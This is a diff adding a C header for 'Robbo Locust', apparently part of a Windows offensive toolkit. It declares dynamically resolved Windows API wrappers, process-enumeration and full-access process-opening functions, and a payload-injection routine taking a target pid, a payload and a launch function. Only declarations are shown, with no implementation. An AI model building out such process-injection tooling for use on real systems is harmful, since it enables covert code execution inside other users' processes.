@@ -1,0 +1,63 @@
+#!name##Robbo2Locust_H
+#!itemType##sfile
+#!info##Robbo Locust header file.
+#!lang##c
+
+#ifndef ROBBO_LOCUST_H
+#define ROBBO_LOCUST_H
+
+#include "robbo2.h"
+
+
+// --------------------------------------------- TYPES --------------------------------------------------
+
+typedef BOOL (*RtypeEnumProcesses)(DWORD[], DWORD, LPDWORD);
+typedef DWORD (*RtypeGetModuleBaseNameA)(HANDLE, HMODULE, LPSTR, DWORD);
+typedef HANDLE (*RtypeGetCurrentProcess)(void);
+typedef int (*RtypeMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
+typedef BOOL (*RtypeCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef HANDLE (*RtypeCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef DWORD (*RtypeWaitForSingleObject)(HANDLE, DWORD);
+typedef DWORD (*RtypeGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
+typedef DWORD (*RtypeGetTempPathA)(DWORD, LPSTR);
+
+// ------------------------------------------- VARIABLES -----------------------------------------------
+extern void *robbo_addr_psapi_dll;
+extern void *robbo_addr_user32_dll;
+
+
+// ------------------------------------------ FUNCTIONS -----------------------------------------------
+
+void robbo_locust_init_test(void);
+void robbo_locust_initialize(void);
+
+BOOL robbo_wapi_EnumProcesses(DWORD pid_list[], DWORD pid_list_size, LPDWORD bytes_writen);
+DWORD robbo_wapi_GetModuleBaseNameA(HANDLE proc_handle, HMODULE mod_handle, LPSTR buff, DWORD buff_size);
+HANDLE robbo_wapi_GetCurrentProcess(void);
+int robbo_wapi_MessageBoxA(HWND hWnd, LPCSTR msgText, LPCSTR title, UINT buttons);
+BOOL robbo_wapi_CreateProcessA(LPCSTR appName, LPSTR cmdLine, LPSECURITY_ATTRIBUTES procAttr, LPSECURITY_ATTRIBUTES thAttr, BOOL inhFlag, DWORD createFlag, LPVOID envPointer, LPCSTR currentDir, LPSTARTUPINFOA startInfo, LPPROCESS_INFORMATION procInfo);
+HANDLE robbo_wapi_CreateThread(LPSECURITY_ATTRIBUTES lpSecAttr, SIZE_T stack_size, LPTHREAD_START_ROUTINE startFunc, LPVOID funArgs, DWORD createFlag, LPDWORD thID);
+DWORD robbo_wapi_WaitForSingleObject(HANDLE hHandle, DWORD milisec);
+DWORD robbo_wapi_GetModuleFileNameA(HMODULE mod_handle, LPSTR buff_name, DWORD buff_size);
+DWORD robbo_wapi_GetTempPathA(DWORD buff_size, LPSTR buff);
+
+
+HANDLE robbo_locust_open_process_info(DWORD pid);
+HANDLE robbo_locust_open_process_full(DWORD pid);
+
+int robbo_locust_inject_payload_basic(DWORD pid, PVOID payload, int payload_size, PVOID func_launch, int flaunch_size);
+
+
+// ------------------------------ FUNCTIONS ADDRESS -------------------------
+
+RtypeEnumProcesses robbo_faddr_EnumProcesses(void);
+RtypeGetModuleBaseNameA robbo_faddr_GetModuleBaseNameA(void);
+RtypeGetCurrentProcess robbo_faddr_GetCurrentProcess(void);
+RtypeMessageBoxA robbo_faddr_MessageBoxA(void);
+RtypeCreateProcessA robbo_faddr_CreateProcessA(void);
+RtypeCreateThread robbo_faddr_CreateThread(void);
+RtypeWaitForSingleObject robbo_faddr_WaitForSingleObject(void);
+RtypeGetModuleFileNameA robbo_faddr_GetModuleFileNameA(void);
+RtypeGetTempPathA robbo_faddr_GetTempPathA(void);
+
+#endif
